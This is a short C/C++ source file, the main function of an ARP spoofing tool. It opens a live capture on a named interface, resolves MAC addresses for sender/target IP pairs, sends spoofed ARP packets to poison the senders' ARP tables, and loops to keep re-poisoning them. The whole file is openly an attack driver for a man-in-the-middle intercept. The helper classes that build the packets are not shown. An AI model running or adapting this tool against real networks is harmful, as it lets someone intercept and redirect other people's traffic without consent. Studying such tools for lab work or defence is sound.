#include "Packet.h"
#include "ArgParser.h"
#include "Headers.h"
#include <stdlib.h>

int main(int argc, char* argv[])
{
    Packet packet;

    //Check argument count and validate the format of the IP address
    if (!parse(argc, argv)) return EXIT_FAILURE;

    //Set network interface (dev)
    packet.setDev(argv[1]);

    //Open the specified dev interface and initialize the packet capture session
    if(!packet.openLiveCapture()) return EXIT_FAILURE;

    //Set the interface information (IP and MAC) for the packet capture;
    if(!packet.setMyInterfaceInfo()) return EXIT_FAILURE;

    //Get MAC from IP, store in arpTable, and infect sender's ARP table
    for (int i = 2; i < argc; i += 2){
        u_int32_t senderIp = inet_addr(argv[i]);
        u_int32_t targetIp = inet_addr(argv[i+1]);

        packet.resolveMacByIpforSpoof(senderIp, targetIp);
        packet.sendSpoofedPacket(senderIp, targetIp, arpHdr::ArpRequest);
    }

    //Continuously re-infect the sender's ARP table when an ARP packet updates it
    packet.continuousArpSpoofing();

    //Close the live capture session
    packet.closeLiveCapture();
}
